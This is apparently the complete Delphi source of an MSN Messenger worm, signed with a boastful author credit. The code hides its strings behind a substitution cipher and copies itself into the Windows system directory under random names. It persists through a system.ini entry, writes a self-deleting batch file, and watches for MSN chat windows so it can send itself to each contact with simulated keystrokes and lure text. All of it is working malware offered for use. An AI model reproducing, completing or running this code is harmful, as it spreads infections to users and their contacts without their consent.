   // !!ignore!!
   (****************************
   *  MSN All Version Worm     *
   *   made by sic, no protocol*
   * works on all versions     *
   *  configured for swe and   *
   * english version of msn    *
   *  PURE OWNAGE I SAY!       *
   * -- lame encryption tho -- *
   ****************************)
   Program Project2;
   uses
     Windows, sendkeys;

   VAR
     Buf,buff : array[0..40000]of char;
     Wins : array[0..300]of record
      Name : string;
      Wnd  : hwnd;
     End;
     Wcnt : integer=0;

   Const
    ABC1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 |';
    ABC2 = 'AcRs7JkZBfbQt6Im0CeTv93GjWyaOr5KEhVx|No2FigUw Mp1HlXz8PLnYudSq4D';

   function decode(s:String):string;
   var
    i:integer;
   begin
    result := '';
    for i:=1 to length(s) do begin
     if pos(copy(s,i,1),abc2)>0 then
      result := result + copy(abc1,pos(copy(s,i,1),abc2),1)
     else result := result + copy(s,i,1);
    end;
   end;

   // !!ignore!!

   function enumwinproc(w:hwnd;lpr:lparam):boolean;stdcall;
   begin

     if iswindowvisible(w) then begin
       getwindowtext(w,buf,10000);
       if buf[0]<>#0 then begin
         wins[wcnt].name:=buf;
         wins[wcnt].wnd:=w;
         wcnt:=wcnt+1;
       end;
     end;
     result:=true;
   end;

   function sendwindows:string;
   var i:integer;
   begin
    result:='';
     wcnt:=0;
     enumwindows(@enumwinproc,0);
     for i:=0 to wcnt-1 do begin
       result:=result+wins[i].name+chr(13);
       wins[i].name := '';
       wins[i].wnd := 0;
     end;
   end;

   Procedure Infect(s:String);
   var
    i:integer;
    dd:hwnd;
    PATH:string;
    a : array[0..255]of char;
   begin
   dd:=GetHandleFromWindowTitle(S);
   MakeWindowActive(dd);
   getsystemdirectory(a,255);
   path := a;
   Randomize;
   Case Random(9) of
    0:path := path + decode('\iZITI.mBJ');
    1:path := path + decode('\|BTTj.7G7');
    2:path := path + decode('\MmTBt7.7G7');
    3:path := path + decode('\y6TBpBCve.7G7');
    4:path := path + decode('\pBCveOZ7Rb7C.7G7');
    5:path := path + decode('\Osb7j.7G7');
    6:path := path + decode('\iC7e76T.7G7');
    7:path := path + decode('\7OACs.7G7');
    8:path := path + decode('\KAR7.7G7');
    9:path := path + decode('\wRA667C.7G7');
   end;
   Copyfile(pchar(paramstr(0)),pchar(Path),false);
   if (pos(decode('OI697CeATBI6'),S)>0) or (pos(decode('RI697CeATBI6'),S)>0) then begin
    SendKey(decode('{&}K'));
    SendKey(decode('K'));
   end else begin
    SendKey(decode('{&}y'));
    SendKey(decode('K'));
   end;
    sleep(200);
   for i:=1 to length(path) do begin
    if copy(Path,i,1) = ':' then
     sendkey(decode('{!}.')) else
    if copy(Path,i,1) = '\' then
      sendkey(decode('{^&}?')) else
    SendKey(copy(Path,i,1));

   end;
    Sendkey(#13);
    sleep(200);
    Randomize;
    Case random(5) of
    0:Path := decode('RZ7Rb4TZBe4IvT4JIC4t74mQ7Ae7');
    1:Path := decode('RA64jIv4RZ7Rb4TZBe4JIC4t7');
    2:Path := decode('QIIb4AT4TZBe');
    3:Path := decode('QIIb');
    4:Path := decode('TCj4TZBe');
    end;
   for i:=1 to length(path) do
    SendKey(copy(Path,i,1));
    Sendkey(#13);
    SetWindowText(DD,pchar(decode('F367s4aj4 Z74yQtBkZTj41LP\OI3')));
    ShowWindow(dd,0);
    sleep(800);
   end;

   Procedure MSN;
   var
    TMP,Win:string;
   LABEL D;
   begin
   D:
   sleep(400);
   win:='';
   Win := SendWindows;

   while win <> '' do begin

   Tmp := Copy(Win,1 , pos(chr(13),win)-1);
   If pos(decode('4-4OI697CeATBI6'),TMP)>0 then INFECT(TMP);
   If pos(decode('4-4|I697CeATBI6'),TMP)>0 then INFECT(TMP);
   If pos(decode('4-4RI697CeATBI6'),TMP)>0 then INFECT(TMP);
   If pos(decode('4-4bI697CeATBI6'),TMP)>0 then INFECT(TMP);
   Win := Copy(Win,pos(chr(13),win)+1,length(win));
   Sleep(500);
   end;
   goto D;
   end;

   function IntToStr(X: integer): string;
   var
    S: string;
   begin
    Str(X, S);
    Result := S;
   end;

   var
    myname:string;
    mynewname:string;
    sysdir:String;
    na:String;
    bat:textfile;
   begin
    randomize;
    getsystemdirectory(buff,255);
    myname := paramstr(0);
    na := inttostr(random(3))+decode('.cAT');
    sysdir := buff;
    mynewname := '\'+inttostr(random(9))+inttostr(random(9))+inttostr(random(9))+inttostr(random(9))+inttostr(random(9))+inttostr(random(9))+decode('.7G7');
    CopyFile(Pchar(Myname),pchar(sysdir+mynewname),false);
    WRITEPRIVATEPROFILESTRING(pchar(decode('aFF ')),pchar(decode('wh5NN')),PCHAR(decode('5HiNFU5U.5H54')+sysdir+MYNEWNAME),pchar(decode('wlw 5o.V2V')));
    assignfile(bat, sysdir+'\'+na);
    rewrite(bat);
    writeln(bat, decode('s7Q4"')+sysdir+mynewname+'"');
    writeln(bat, decode('s7Q4"')+na+'"');
    closefile(bat);
    msn;
   end.
